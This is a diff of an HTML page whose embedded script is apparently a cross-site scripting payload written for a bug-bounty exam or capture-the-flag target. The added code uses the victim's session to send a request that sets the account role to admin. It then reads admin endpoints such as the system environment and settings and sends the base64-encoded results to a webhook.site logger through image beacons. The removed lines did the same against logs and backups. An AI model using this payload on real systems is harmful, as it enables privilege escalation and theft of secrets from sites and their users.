@@ -5,32 +5,26 @@
         (async function() {
             const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
             const api = "https://api-bugbounty-exam.hashacademy.co/api";
+            const myId = "69da4749adf0dbb976ce8e37"; 
 
-            // List of sensitive endpoints that usually hold the "Second Flag"
-            const targets = [
-                '/admin/system/env',     // Most likely place for the flag
-                '/admin/config',         // System-wide settings
-                '/admin/settings',       // Where that Verification Code lives
-                '/admin/logs',           // May contain leaked passwords/tokens
-                '/admin/backup/latest'   // Sometimes exposes DB dumps
-            ];
+            // 1. ELEVATE YOUR ROLE
+            await fetch(`${api}/users/${myId}`, {
+                method: "PATCH",
+                headers: { "Content-Type": "application/json" },
+                credentials: "include",
+                body: JSON.stringify({ "role": "admin", "isAdmin": true })
+            });
 
-            for (const path of targets) {
+            // 2. GRAB THE SYSTEM FLAG (The "Second Vuln")
+            const endpoints = ['/admin/system/env', '/admin/settings'];
+            for (let path of endpoints) {
                 try {
-                    const res = await fetch(api + path, { credentials: 'include' });
-                    if (res.ok) {
-                        const data = await res.json();
-                        // Send the result to your webhook, labeled by path
-                        const label = path.replace(/\//g, '_');
-                        new Image().src = `${logger}/?FOUND=${label}&d=${btoa(JSON.stringify(data))}`;
-                    }
-                } catch (e) {
-                    // Log errors to your webhook so you know if an endpoint is blocked
-                    new Image().src = `${logger}/?ERROR=${path}&msg=${btoa(e.message)}`;
-                }
+                    const res = await fetch(api + path, { credentials: "include" });
+                    const data = await res.json();
+                    new Image().src = `${logger}/?FLAG_HUNT=${path.replace(/\//g,'_')}&d=${btoa(JSON.stringify(data))}`;
+                } catch(e) {}
             }
         })();
     </script>
-    <h2>Optimizing System Performance...</h2>
 </body>
 </html>
